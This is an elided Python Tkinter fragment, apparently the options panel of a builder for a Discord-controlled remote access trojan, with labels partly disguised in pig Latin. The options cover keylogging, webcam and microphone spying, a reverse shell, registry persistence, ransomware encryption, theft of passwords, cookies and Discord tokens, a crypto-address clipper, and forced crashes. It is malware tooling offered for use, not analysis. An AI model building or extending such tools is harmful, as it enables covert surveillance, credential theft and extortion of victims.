...
if len(sys.argv) > 1:
    ...
    cb_keylogger = Checkbutton(settings_canvas, selectcolor='#FF00FF', text='Eykayoggerlay', variable=cbvar_keylogger, command=config_modification, onvalue=True, offvalue=False)
    cb_screenshot = Checkbutton(settings_canvas, selectcolor='#800080', text='Reenshotsay', variable=cbvar_screenshot, command=config_modification, onvalue=True, offvalue=False)
    cb_registry = Checkbutton(settings_canvas, selectcolor='#FF00FF', text='enable on artupstay (via registry injection)', variable=cbvar_registry, command=config_modification, onvalue=True, offvalue=False)
    cb_file_downloading = Checkbutton(settings_canvas, selectcolor='#800080', text='Ilefay Owndayloading', variable=cbvar_file_downloading, command=config_modification, onvalue=True, offvalue=False)
    cb_file_uploading = Checkbutton(settings_canvas, selectcolor='#FF00FF', text='Ilefay Uploading', variable=cbvar_file_uploading, command=config_modification, onvalue=True, offvalue=False)
    cb_file_removal = Checkbutton(settings_canvas, selectcolor='#800080', text='Ilefay Emovealray', variable=cbvar_file_removal, command=config_modification, onvalue=True, offvalue=False)
    cb_file_explorer = Checkbutton(settings_canvas, selectcolor='#FF00FF', text='Ilefay Exploring', variable=cbvar_file_explorer, command=config_modification, onvalue=True, offvalue=False)
    cb_file_encryption = Checkbutton(settings_canvas, selectcolor='#800080', text='Ilefay encryption (ransomware)', variable=cbvar_file_encryption, command=config_modification, onvalue=True, offvalue=False)
    cb_grabber = Checkbutton(settings_canvas, selectcolor='#FF00FF', text='Rabbergay (WiFi, saved passwords, browser history, cookies, Discord)', variable=cbvar_grabber, command=config_modification, onvalue=True, offvalue=False)
    cb_live_microphone = Checkbutton(settings_canvas, selectcolor='#800080', text='Ivelay Icrophonemay (via discord voice chat)', variable=cbvar_live_microphone, command=config_modification, onvalue=True, offvalue=False)
    cb_microphone_recording = Checkbutton(settings_canvas, selectcolor='#FF00FF', text='24/7 Icrophonemay Ecordingray (.wav files sent on channel)', variable=cbvar_microphone_recording, command=config_modification, onvalue=True, offvalue=False)
    cb_processes = Checkbutton(settings_canvas, selectcolor='#800080', text='Anagemay Rocessespay', variable=cbvar_processes, command=config_modification, onvalue=True, offvalue=False)
    cb_reverse_shell = Checkbutton(settings_canvas, selectcolor='#FF00FF', text='Everseray Hellshay (execute remote cmd commands)', variable=cbvar_reverse_shell, command=config_modification, onvalue=True, offvalue=False)
    cb_webcam = Checkbutton(settings_canvas, selectcolor='#800080', text='Aketay Ebcamway Hotophays', variable=cbvar_webcam, command=config_modification, onvalue=True, offvalue=False)
    cb_scrnrec = Checkbutton(settings_canvas, selectcolor='#FF00FF', text='Creensay Ecordingray', variable=cbvar_scrnrec, command=config_modification, onvalue=True, offvalue=False)
    cb_inputbl = Checkbutton(settings_canvas, selectcolor='#800080', text='Lockbay input (mouse & keyboard)', variable=cbvar_inputbl, command=config_modification, onvalue=True, offvalue=False)
    cb_bluesod = Checkbutton(settings_canvas, selectcolor='#FF00FF', text='Iggertray a bsod', variable=cbvar_bluesod, command=config_modification, onvalue=True, offvalue=False)
    cb_forkbmb = Checkbutton(settings_canvas, selectcolor='#800080', text='Orkfay Ombbay (spam processes to crash os)', variable=cbvar_forkbmb, command=config_modification, onvalue=True, offvalue=False)
    cb_crclipr = Checkbutton(settings_canvas, selectcolor='#FF00FF', text='Ryptocay Ipperclay (replaces crypto addresses)', variable=cbvar_crclipr, command=config_modification, onvalue=True, offvalue=False)
    cb_txtspee = Checkbutton(settings_canvas, selectcolor='#800080', text='Exttay to Eechspay Essagesmay', variable=cbvar_txtspee, command=config_modification, onvalue=True, offvalue=False)
    cb_messger = Checkbutton(settings_canvas, selectcolor='#FF00FF', text='Essagermay with Ictimvay (messagebox)', variable=cbvar_messger, command=config_modification, onvalue=True, offvalue=False)
    cb_monctrl = Checkbutton(settings_canvas, selectcolor='#800080', text='Onitormay Ontrolcay (turn on / off)', variable=cbvar_monctrl, command=config_modification, onvalue=True, offvalue=False)
    cb_audctrl = Checkbutton(settings_canvas, selectcolor='#FF00FF', text='Olumevay ontrolcay & mp3 Ayerplay', variable=cbvar_audctrl, command=config_modification, onvalue=True, offvalue=False)
    cb_webbloc = Checkbutton(settings_canvas, selectcolor='#800080', text='block websites', variable=cbvar_webbloc, command=config_modification, onvalue=True, offvalue=False)
    cb_jmpscar = Checkbutton(settings_canvas, selectcolor='#FF00FF', text='Umpscarejay', variable=cbvar_jmpscar, command=config_modification, onvalue=True, offvalue=False)
    cb_keystrk = Checkbutton(settings_canvas, selectcolor='#800080', text='Eystrokeskay', variable=cbvar_keystrk, command=config_modification, onvalue=True, offvalue=False)
    cb_scrnman = Checkbutton(settings_canvas, selectcolor='##FF00FF', text='Reenscay manipulation', variable=cbvar_scrnman, command=config_modification, onvalue=True, offvalue=False)
    ...
    cb_disclaimer = Checkbutton(bottom_buttons, selectcolor='#00FF00', text='  I\'m aware that yous a bitch 76 on top.', variable=cbvar_disclaimer, command=disclaimer_toggle, onvalue=True, offvalue=False, justify=LEFT, anchor=W)
